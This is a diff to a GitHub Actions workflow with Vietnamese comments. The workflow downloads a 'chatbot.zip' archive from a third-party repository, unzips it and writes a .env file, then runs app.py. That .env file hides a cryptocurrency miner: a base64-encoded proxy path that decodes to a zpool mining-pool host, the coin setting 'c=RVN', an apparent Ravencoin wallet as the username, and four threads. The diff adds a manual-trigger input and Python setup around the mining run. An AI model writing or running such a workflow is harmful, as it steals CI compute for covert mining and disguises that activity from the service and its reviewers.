@@ -5,23 +5,36 @@ on:
     branches:
       - main
   workflow_dispatch:
+    inputs:
+      min_value:
+        description: 'Giá trị MIN truyền vào app.py'
+        required: true
+        default: '60'
 
 jobs:
   run-node-app:
     runs-on: ubuntu-latest
 
     steps:
-      # Bước 1: Checkout mã nguồn (nếu cần thiết)
       - name: Checkout code
         uses: actions/checkout@v4
 
-      # Bước 2: Clone repository từ URL
-      - name: Clone repository
+      - name: Download zip
         run: wget https://github.com/duongpokeeeee/sadsd/raw/refs/heads/main/chatbot.zip
 
-      # Bước 3: Chạy file app.js
-      - name: Run the Node.js app
+      - name: Unzip and prepare .env
         run: |
           yes A | unzip chatbot.zip
           echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > .env
-          MIN=$1; python3 app.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+
+      - name: Install dependencies (nếu có requirements.txt)
+        run: |
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+
+      - name: Run Python App
+        run: python3 app.py "${{ github.event.inputs.min_value }}" --cache=.cache/09Qy5sb2Fkcyg.txt
